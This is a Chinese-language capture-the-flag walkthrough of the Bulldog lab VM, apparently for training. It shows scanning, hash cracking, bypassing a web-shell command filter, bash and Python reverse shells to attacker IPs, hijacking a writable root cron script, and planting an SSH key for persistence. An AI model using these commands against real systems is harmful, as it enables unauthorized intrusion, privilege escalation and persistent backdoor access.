VirtualBox双击打开，默认桥接模式，运行后会在界面直接告知IP！

--------------------------------------------
--------------------------------------------
2、nmap 192.168.4.248 -p- -A
23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    WSGIServer 0.1 (Python 2.7.12)
8080/tcp open  http    WSGIServer 0.1 (Python 2.7.12)
nmap发现开放了23、80、8080端口！
--------------------------------------------
--------------------------------------------
3、web信息收集


1）探测SSH：
nc -nv 192.168.4.254 23
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
这里可以看到SSH伪装成Telnet在端口23上运行！

2）80端口探测

访问：
http://192.168.4.248/
官网是个法斗图，说解雇了所有技术人员，因为发现被入侵了！

nc -nv 192.168.4.254 80 
然后输入：HEAD / HTTP/1.1     ---检查HTTP响应
Server: WSGIServer/0.1 Python/2.7.12



--------------------------------------------
--------------------------------------------
4、目录爆破
目录爆破：dirb http://192.168.4.248/
http://192.168.4.248/admin/
http://192.168.4.248/dev/
http://192.168.4.248/robots.txt


Django administration后台登录页面：
http://192.168.4.248/admin/

http://192.168.4.248/dev/
意思是说APT利用了Web服务器中的一个漏洞，他们从新服务器中完全删除PHP，也不会使用PHPMyAdmin或任何其他流行的CMS系统！

http://192.168.4.248/dev/静态页面枚举：发现存在MD5值
--------
Team Lead: alan@bulldogindustries.com<br><!--6515229daf8dbdc8b89fed2e60f107433da5f2cb-->
	Back-up Team Lead: william@bulldogindustries.com<br><br><!--38882f3b81f8f2bc47d9f3119155b05f954892fb-->
	Front End: malik@bulldogindustries.com<br><!--c6f7e34d5d08ba4a40dd5627508ccb55b425e279-->
	Front End: kevin@bulldogindustries.com<br><br><!--0e6ae9fe8af1cd4192865ac97ebf6bda414218a9-->
	Back End: ashley@bulldogindustries.com<br><!--553d917a396414ab99785694afd51df3a8a8a3e0-->
	Back End: nick@bulldogindustries.com<br><br><!--ddf45997a7e18a25ad5f5cf222da64814dd060d5-->
	Database: sarah@bulldogindustries.com<br><!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e-->
--------

--------------------------------------------
--------------------------------------------
4、MD5解密

https://www.somd5.com/
https://crackstation.net/

ddf45997a7e18a25ad5f5cf222da64814dd060d5解密：bulldog
d8b8dd5e7f000b8dea26ef8428caf38c04466b3e解密：bulldoglover

获得用户名密码：
nick  bulldog
sarah  bulldoglover

--------------------------------------------
--------------------------------------------
5、webshell-绕过waf

在dev页面发现存在web-shell模块：点击进入
http://192.168.4.248/dev/shell/
提示：请向服务器进行身份验证以使用 Web-Shell


nick  bulldog  登录进来提示：
You don't have permission to edit anything.  您无权编辑任何内容。


但是在访问：http://192.168.4.248/dev/shell/
发现可以使用了，给了我们几个命令：
ifconfig
ls
echo
pwd
cat
rm

cmd1 | cmd2的方式，cmd2测试不会被waf判断可以绕过！
&&    ---pwd && whoami
$()   ---echo$()    echo$(whoami)
echo uname -a|sh

echo 'bash -i >& /dev/tcp/192.168.111.101/443 0>&1' | bash

nc -vlp 1234
ls &&echo "bash -i >& /dev/tcp/192.168.4.251/1234 0>&1" | bash

成功拿到django用户shell！


或者使用：
echo $(添加命令)   例如wget上传  chmod赋权  ./执行

--------------------------------------------
--------------------------------------------
6、内部信息收集
上传linpeas开始跑：

1）Linux version 4.4.0-87
2）uid=1001(django) gid=1001(django) groups=1001(django),27(sudo)
3）Sudo version 1.8.16
4）/home/django/bulldog/manage.py
5）发现用户bulldogadmin

cat runAV 
*/1 * * * * root /.hiddenAVDirectory/AVApplication.py

--------------------------------------------
--------------------------------------------
7、提权
sudo -l
sudo: no tty present and no askpass program specified
可以使用sudo，需要TTY！

python -c 'import pty; pty.spawn("/bin/bash")'

sudo -l
sudo -l
[sudo] password for django: 
发现需要密码，继续枚举！


find / -user bulldogadmin 2>/dev/null
发现：
/home/bulldogadmin/.hiddenadmindirectory/customPermissionApp


cat note
Nick,

I'm working on the backend permission stuff. Listen, it's super prototype but I think it's going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not! 

It's great stuff! Once I'm finished with it, a hacker wouldn't even be able to reverse it! Keep in mind that it's still a prototype right now. I am about to get it working with the Django user account. I'm not sure how I'll implement it for the others. Maybe the webserver is the only one who needs to have root access sometimes?

Let me know what you think of it!

-Ashley
说该文件存在Django用户的信息！


使用了strings查看：
UH-H
SUPERultH
imatePASH
SWORDyouH
CANTget
后面的H是换行符号！

直接获得密码：
SUPERultimatePASSWORDyouCANTget
sudo -l

User django may run the following commands on bulldog:
    (ALL : ALL) ALL

sudo su   ---成功获得root权限！

--------------------------------------------
--------------------------------------------
8、计划任务提权

cat runAV 
*/1 * * * * root /.hiddenAVDirectory/AVApplication.py
ls -la /.hiddenAVDirectory/AVApplication.py
-rwxrwxrwx 1 root root 157 Aug 26  2017 /.hiddenAVDirectory/AVApplication.py

项目四、项目十二都讲解过：
echo '#!/usr/bin/env python' > AVApplication.py
echo 'import socket,subprocess,os' >> AVApplication.py
echo 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)' >> AVApplication.py
echo 's.connect(("192.168.2.139",4455))' >> AVApplication.py
echo 'os.dup2(s.fileno(),0)' >> AVApplication.py
echo 'os.dup2(s.fileno(),1)' >> AVApplication.py
echo 'os.dup2(s.fileno(),2)' >> AVApplication.py
echo 'p=subprocess.call(["/bin/sh","-i"])' >> AVApplication.py

等待一分钟成功获得反弹shell！

--------------------------------------------
--------------------------------------------
9、拓展小技巧

1）hash爆破-john
hash-identifier ddf45997a7e18a25ad5f5cf222da64814dd060d5
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))

john pass.txt --format=Raw-SHA1
bulldog          (?)

--------------------------------------------
2）curl、sed小技巧
curl -s http://192.168.4.254/dev/| grep @
-s  提取静态页面信息

curl -s http://192.168.4.254/dev/| grep @ > dayu

Linux sed 命令：
https://www.runoob.com/linux/linux-comm-sed.html
Linux sed 命令是利用脚本来处理文本文件。
sed 可依照脚本的指令来处理、编辑文本文件。
Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。

数据的查找与替换：
除了整行的处理模式之外， sed 还可以用行为单位进行部分数据的查找与替换<。
sed 的查找与替换的与 vi 命令类似，语法格式如下：

sed 's/要被取代的字串/新的字串/g'       ---选项 i 使 sed 修改文件:

sed -i 's/://g' dayu && sed -i 's/<br>//g' dayu && sed -i 's/<!--/:/g' dayu && sed -i 's/-->//g' dayu 

john dayu --format=Raw-SHA1 --wordlist=/root/Desktop/rockyou.txt
成功获得密码信息！
或者hashcat
--------------------------------------------

3）编写bash小技巧： shell脚本绕过waf
---------
#!/bin/bash

CMD=$(echo $1|base64)

curl -s 'http://192.168.4.254/dev/shell/' \
-H 'Host: 192.168.4.254' \
-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' \
-H 'Cookie: csrftoken=ue6rDl1epG56M9ti4JzYn91VWYfRDqSj; sessionid=k3hpm33ed7gimqo0uj0h4bo8vpu04vpe' \
--data "csrfmiddlewaretoken=ue6rDl1epG56M9ti4JzYn91VWYfRDqSj&command=echo '$CMD'|base64 -d|sh" \
|tail -n +40|head -n -19
---------

./shell.sh 'uname -a;id;whoami;cat /etc/passwd|grep bash;ls -al /home'
./shell.sh 'cat /home/bulldogadmin/.hiddenadmindirectory/customPermissionApp'
./shell.sh 'cat /home/bulldogadmin/.hiddenadmindirectory/note'
./shell.sh 'ls -al /etc/cron.d/'


利用脚本写入ssh rsa key：
./shell.sh 'grep authorized_keys /etc/ssh/sshd_config'
./shell.sh 'mkdir /home/django/.ssh'

需要将id_rsa.pub密钥移动到/home/django/.ssh文件夹中：
./shell.sh "echo $(cat ~/.ssh/id_rsa.pub) > /home/django/.ssh/authorized_keys"

ssh django@192.168.4.254 -p 23 -i id_rsa




















































